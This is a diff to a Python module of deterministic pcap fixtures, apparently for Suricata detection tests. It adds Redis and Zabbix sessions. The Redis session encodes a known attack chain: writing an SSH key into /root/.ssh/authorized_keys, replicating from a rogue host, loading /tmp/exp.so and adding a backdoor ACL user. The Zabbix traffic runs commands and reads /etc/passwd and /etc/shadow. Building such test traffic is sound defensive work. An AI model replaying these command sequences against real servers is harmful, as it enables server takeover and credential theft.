@@ -8,6 +8,7 @@ Built with struct like tests/pcap_fixtures.py, deterministic, so the
 expected values never drift. Keep it deterministic: changing a single byte
 here means re-running Suricata over it to refresh those expectations.
 """
+import json
 import socket
 import functools
 import struct
@@ -2703,3 +2704,149 @@ def tls_failure_packets():
 
 def write_tls_failure_pcap(path):
     write_pcap(path, tls_failure_packets())
+
+
+# ---------------------------------------------------------------- Redis
+#
+# Shaped on a capture of Redis 8.0.2 and redis-cli. REDIS_SERVER asks for
+# a password: CLIENT:43000 sends PING without one (NOAUTH), CLIENT:43001
+# sends inline commands, as netcat does - a wrong password (WRONGPASS),
+# then INFO (NOAUTH). CLIENT:43002 logs in (S3cretPass) and reads INFO
+# (split across two segments), sets and gets a key, tries to point the
+# save at /root/.ssh/authorized_keys (refused: protected config), stores
+# an SSH key and saves, makes the server a replica of 10.66.66.66:21000
+# and back, tries to load a module (refused), runs Lua, adds a user
+# (its password Backd00r!), turns appendonly off and flushes everything.
+# CLIENT:43003 speaks RESP3 to REDIS_OPEN, which asks for no password:
+# HELLO 3, KEYS *, two SETs pipelined in one segment, then SUBSCRIBE and
+# a message pushed to it.
+
+REDIS_SERVER = '198.51.100.101'
+REDIS_OPEN = '198.51.100.102'
+REDIS_INFO = (b'# Server\r\nredis_version:8.0.2\r\nredis_mode:standalone\r\nos:Linux 6.12.113+deb13-amd64 x86_64\r\n'
+              b'tcp_port:6379\r\n\r\n# Replication\r\nrole:master\r\nconnected_slaves:0\r\n')
+
+
+def _resp(*args):
+    out = b'*%d\r\n' % len(args)
+    for arg in args:
+        arg = arg.encode() if isinstance(arg, str) else arg
+        out += b'$%d\r\n%s\r\n' % (len(arg), arg)
+    return out
+
+
+def _resp_bulk(data):
+    return b'$%d\r\n%s\r\n' % (len(data), data)
+
+
+def redis_packets():
+    ok = b'+OK\r\n'
+    noauth = b'-NOAUTH Authentication required.\r\n'
+    protected = b"-ERR CONFIG SET failed (possibly related to argument '%s') - can't set protected config\r\n"
+    info = _resp_bulk(REDIS_INFO)
+    session = [(True, _resp('AUTH', 'S3cretPass')), (False, ok),
+               (True, _resp('INFO', 'server')), (False, info[:40]), (False, info[40:])]
+    for command, reply in ((('SET', 'session:1', 'hello'), ok), (('GET', 'session:1'), _resp_bulk(b'hello')),
+                           (('CONFIG', 'SET', 'dir', '/root/.ssh'), protected % b'dir'),
+                           (('CONFIG', 'SET', 'dbfilename', 'authorized_keys'), protected % b'dbfilename'),
+                           (('SET', 'crackit', '\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7 attacker@kali\n\n'), ok),
+                           (('SAVE',), ok), (('REPLICAOF', '10.66.66.66', '21000'), ok), (('REPLICAOF', 'NO', 'ONE'), ok),
+                           (('MODULE', 'LOAD', '/tmp/exp.so'), b'-ERR MODULE command not allowed.\r\n'),
+                           (('EVAL', "return redis.call('dbsize')", '0'), b':2\r\n'),
+                           (('ACL', 'SETUSER', 'backdoor', 'on', '>Backd00r!', '~*', '+@all'), ok),
+                           (('CONFIG', 'SET', 'appendonly', 'no'), ok), (('FLUSHALL',), ok)):
+        session += [(True, _resp(*command)), (False, reply)]
+    hello = (b'%7\r\n+server\r\n+redis\r\n+version\r\n+7.2.4\r\n+proto\r\n:3\r\n+id\r\n:5\r\n+mode\r\n+standalone\r\n'
+             b'+role\r\n+master\r\n+modules\r\n*0\r\n')
+    open_session = [(True, _resp('HELLO', '3')), (False, hello),
+                    (True, _resp('KEYS', '*')), (False, b'*2\r\n$6\r\nuser:1\r\n$6\r\nuser:2\r\n'),
+                    (True, _resp('SET', 'a', '1') + _resp('SET', 'b', '2')), (False, b'+OK\r\n+OK\r\n'),
+                    (True, _resp('SUBSCRIBE', 'news')), (False, b'>3\r\n$9\r\nsubscribe\r\n$4\r\nnews\r\n:1\r\n'),
+                    (False, b'>3\r\n$7\r\nmessage\r\n$4\r\nnews\r\n$5\r\nhello\r\n')]
+    return (tcp_segments(CLIENT, REDIS_SERVER, 43000, 6379, [(True, _resp('PING')), (False, noauth)])
+            + tcp_segments(CLIENT, REDIS_SERVER, 43001, 6379, [
+                (True, b'AUTH wrongpass\r\nINFO\r\n'),
+                (False, b'-WRONGPASS invalid username-password pair or user is disabled.\r\n' + noauth)])
+            + tcp_segments(CLIENT, REDIS_SERVER, 43002, 6379, session)
+            + tcp_segments(CLIENT, REDIS_OPEN, 43003, 6379, open_session))
+
+
+def write_redis_pcap(path):
+    write_pcap(path, redis_packets())
+
+
+# ---------------------------------------------------------------- Zabbix
+#
+# Shaped on a capture of Zabbix agent 7.0.22. CLIENT runs zabbix_get
+# against ZABBIX_AGENT (port 10050): agent.version, system.run[id] (run:
+# uid=0(root)...), system.run[cat /etc/passwd] (refused - Unsupported
+# item key) and a 7.0 JSON passive check of system.uname. ZABBIX_AGENT
+# asks ZABBIX_SERVER (10051) for its active checks twice - given
+# system.uptime, system.run[cat /etc/passwd | head -3] and
+# vfs.file.contents[/etc/shadow], and the first time a remote command
+# (id 1001: id; uname -a) - and sends its data: the passwd lines and the
+# command's output. ZABBIX_PROXY fetches its configuration, which carries
+# a host's IPMI password and TLS PSK and a secret macro. CLIENT asks the
+# server to run script 6 on host 10596, which fails.
+
+ZABBIX_SERVER = '198.51.100.103'
+ZABBIX_AGENT = '198.51.100.104'
+ZABBIX_PROXY = '198.51.100.105'
+
+
+def _zabbix(data):
+    data = data if isinstance(data, bytes) else json.dumps(data, separators=(',', ':')).encode()
+    return b'ZBXD\x01' + struct.pack('<II', len(data), 0) + data
+
+
+def zabbix_packets():
+    passive = [('agent.version', b'7.0.22'), ('system.run[id]', b'uid=0(root) gid=0(root) groups=0(root)'),
+               ('system.run[cat /etc/passwd]', b'ZBX_NOTSUPPORTED\x00Unsupported item key.')]
+    packets = []
+    port = 43100
+    for key, value in passive:
+        packets += tcp_segments(CLIENT, ZABBIX_AGENT, port, 10050, [(True, _zabbix(key.encode())), (False, _zabbix(value))])
+        port += 1
+    packets += tcp_segments(CLIENT, ZABBIX_AGENT, port, 10050, [
+        (True, _zabbix({'request': 'passive checks', 'data': [{'key': 'system.uname', 'timeout': 3}]})),
+        (False, _zabbix({'version': '7.0.22', 'variant': 1, 'data': [{'value': 'Linux web01 6.12.113 x86_64'}]}))])
+    items = [{'key': 'system.uptime', 'itemid': 1, 'delay': '5s', 'lastlogsize': 0, 'mtime': 0},
+             {'key': 'system.run[cat /etc/passwd | head -3]', 'itemid': 2, 'delay': '5s', 'lastlogsize': 0, 'mtime': 0},
+             {'key': 'vfs.file.contents[/etc/shadow]', 'itemid': 3, 'delay': '5s', 'lastlogsize': 0, 'mtime': 0}]
+    ask = {'request': 'active checks', 'host': 'web01', 'config_revision': 0, 'session': 'a1b2', 'version': '7.0.22',
+           'variant': 1}
+    passwd = 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin'
+    exchanges = [
+        (ask, {'response': 'success', 'config_revision': 3, 'data': items,
+               'commands': [{'command': 'id; uname -a', 'id': 1001, 'wait': 1}]}),
+        ({'request': 'agent data', 'session': 'a1b2', 'version': '7.0.22', 'variant': 1, 'host': 'web01',
+          'data': [{'itemid': 1, 'value': '1218215', 'id': 1, 'clock': 1794046455, 'ns': 1},
+                   {'itemid': 2, 'value': passwd, 'id': 2, 'clock': 1794046455, 'ns': 2}],
+          'commands': [{'id': 1001, 'value': 'uid=0(root) gid=0(root) groups=0(root)\nLinux web01 6.12.113'}]},
+         {'response': 'success', 'info': 'processed: 2; failed: 0; total: 2; seconds spent: 0.000100'}),
+        (dict(ask, config_revision=3), {'response': 'success', 'config_revision': 3, 'data': items}),
+        ({'request': 'agent data', 'session': 'a1b2', 'version': '7.0.22', 'variant': 1, 'host': 'web01',
+          'data': [{'itemid': 3, 'value': 'root:*:20753:0:99999:7:::', 'id': 3, 'clock': 1794046456, 'ns': 3}]},
+         {'response': 'success', 'info': 'processed: 1; failed: 0; total: 1; seconds spent: 0.000100'})]
+    port = 43200
+    for request, response in exchanges:
+        packets += tcp_segments(ZABBIX_AGENT, ZABBIX_SERVER, port, 10051, [(True, _zabbix(request)), (False, _zabbix(response))])
+        port += 1
+    config = {'data': {
+        'hosts': {'fields': ['hostid', 'host', 'status', 'ipmi_username', 'ipmi_password', 'tls_psk_identity', 'tls_psk'],
+                  'data': [[10620, 'db01', 0, 'admin', 'ipmiPass1', 'psk01', '1f87b6e3a0c2d4'],
+                           [10621, 'web01', 0, '', '', '', '']]},
+        'globalmacro': {'fields': ['globalmacroid', 'macro', 'value', 'type'],
+                        'data': [[2, '{$SNMP_COMMUNITY}', 'public', 0], [3, '{$DB.PASSWORD}', 'Sup3rS3cret', 1]]}},
+        'config_revision': 8}
+    packets += tcp_segments(ZABBIX_PROXY, ZABBIX_SERVER, 43300, 10051, [
+        (True, _zabbix({'request': 'proxy config', 'host': 'Proxy1', 'version': '7.0.17', 'session': 'c3d4',
+                        'config_revision': 0})), (False, _zabbix(config))])
+    packets += tcp_segments(CLIENT, ZABBIX_SERVER, 43301, 10051, [
+        (True, _zabbix({'request': 'command', 'scriptid': '6', 'sid': '3e9d', 'clientip': CLIENT, 'hostid': '10596'})),
+        (False, _zabbix({'response': 'failed', 'info': 'Zabbix agent interface is not defined for host [Testhost]'}))])
+    return packets
+
+
+def write_zabbix_pcap(path):
+    write_pcap(path, zabbix_packets())
